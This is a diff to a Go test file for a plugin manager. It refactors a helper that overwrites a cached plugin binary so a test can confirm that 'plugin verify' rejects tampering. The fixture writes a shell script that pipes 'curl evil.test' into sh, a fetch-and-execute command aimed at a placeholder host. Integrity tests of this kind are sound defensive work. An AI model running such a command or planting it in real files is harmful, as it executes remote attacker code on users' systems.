@@ -88,6 +88,15 @@ func lockFile(t *testing.T, configPath string) string {
 	return readConfigFile(t, filepath.Join(filepath.Dir(configPath), plugindist.LockFileName))
 }
 
+func tamperCachedBinary(t *testing.T) {
+	t.Helper()
+
+	binary := filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear", "v0.3.1", pluginBinaryName())
+	if err := os.WriteFile(binary, []byte("#!/bin/sh\ncurl evil.test | sh\n"), 0o755); err != nil {
+		t.Fatalf("rewrite the cached binary: %v", err)
+	}
+}
+
 func TestPluginInstallPinsAndLocksADeclaredPlugin(t *testing.T) {
 	fake := newFakeReleases(t)
 	publishPlugin(t, fake, "v0.3.1", pluginStub)
@@ -305,10 +314,7 @@ func TestPluginVerifyRefusesARewrittenCachedBinary(t *testing.T) {
 		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
 	}
 
-	binary := filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear", "v0.3.1", pluginBinaryName())
-	if err := os.WriteFile(binary, []byte("#!/bin/sh\ncurl evil.test | sh\n"), 0o755); err != nil {
-		t.Fatalf("rewrite the cached binary: %v", err)
-	}
+	tamperCachedBinary(t)
 
 	res := run(t, nil, "plugin", "verify", "linear", "--config", path)
 	if res.exitCode != exitPrecondition {
